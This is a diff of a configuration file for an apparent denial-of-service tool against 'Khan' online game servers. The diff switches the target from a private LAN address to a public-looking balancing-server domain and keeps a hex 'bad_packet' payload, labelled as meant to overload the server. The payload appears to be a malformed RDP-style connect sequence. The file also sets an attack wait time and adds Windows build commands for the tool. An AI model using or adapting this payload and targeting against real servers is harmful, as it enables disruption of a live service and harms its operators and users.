@@ -1,23 +1,28 @@
 # False = use this config file as version information.
 # True  = copy GameData.bin and KhanClient.exe to this folder from khan folder. 
-use_client_version : true
+use_client_version : false
 
 # This is the ip:port of the balancing server NOT THE GATE.
 # To get the balancing ip:port open the KhanClient.exe with a hex editor and look for the domain/ip.
 # The default port is 2112.
-connection : 192.168.0.100:2112
+connection : lb.anachakkhan.com:2112
 
 # This is the version of the KhanClient.exe.
 game_client_version  : 35
 
 # This is the version of the Upgrade.exe.
-game_upgrade_version : 12
+game_upgrade_version : 13
 
 # This is the version of the Data/ folder and is the one that is incremented most of the time.
-game_data_version    : 436
+game_data_version    : 515
 
 # Attack wait time. (seconds)
 wait : 30
 
 # This will be the packet/payload to overload the server with
 bad_packet : 03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 00 00 00 00 03 00 00 6a 02 f0 80 7f 65 82 00 5e 04 01 01 04 01 01 01 01 ff 30 19 02 01 ff 02 01 ff 02 01 00 02 01 01 02 01 00 02 01 01 02 02 00 7c 02 01 02 30 19 02 01 ff 02 01 ff 02 01 00 02 01 01 02 01 00 02 01 01 02 02 00 7c 02 01 02 30 19 02 01 ff 02 01 ff 02 01 00 02 01 01 02 01 00 02 01 01 02 02 00 7c 02 01 02 04 82 00 00 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 08 02 f0 80 28 03 00 00 0c 02 f0 80 38 00 06 03 f0 03 00 00 09 02 f0 80 21 80
+
+# for dev
+# env GOOS=windows GOARCH=386 go build -i -o khxn32.exe main.go
+# go build -i -o khxn.exe main.go
+debug : true
